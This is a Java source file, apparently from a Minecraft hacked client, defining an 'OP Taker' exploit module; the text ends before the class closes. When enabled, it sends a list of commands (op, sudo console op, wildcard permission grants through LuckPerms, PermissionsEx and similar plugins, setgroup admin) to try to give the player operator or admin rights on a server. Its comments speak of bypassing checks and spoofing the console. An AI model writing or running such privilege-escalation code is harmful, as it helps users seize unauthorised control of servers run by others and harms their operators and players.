package com.example.verhack.module.exploit;

import com.example.verhack.module.Category;
import com.example.verhack.module.Module;

public class OpTaker extends Module {
    public OpTaker() {
        super("OP Taker", "Attempts to gain OP permissions", Category.EXPLOIT);
    }

    @Override
    public void onEnable() {
        if (mc().player != null) {
            String name = mc().player.getName().getString();

            // Comprehensive command list for various plugins and setups
            String[] commands = {
                "op " + name,
                "minecraft:op " + name,
                "sudo console op " + name,
                "authme op " + name,
                "permissions set " + name + " *",
                "pex user " + name + " add *",
                "lp user " + name + " permission set * true",
                "setgroup " + name + " admin",
                "user " + name + " group set admin",
                "manuadd " + name + " admin"
            };

            for (String cmd : commands) {
                // Using sendCommand is standard, but some servers block it.
                // Directly sending the packet can sometimes bypass basic client-side checks.
                mc().player.connection.sendCommand(cmd);
            }

            // Advanced spoofing: trying to execute commands via social engineering or plugin bugs
            // Example: pretending to be a console or another player (highly server-dependent)
        }
    }
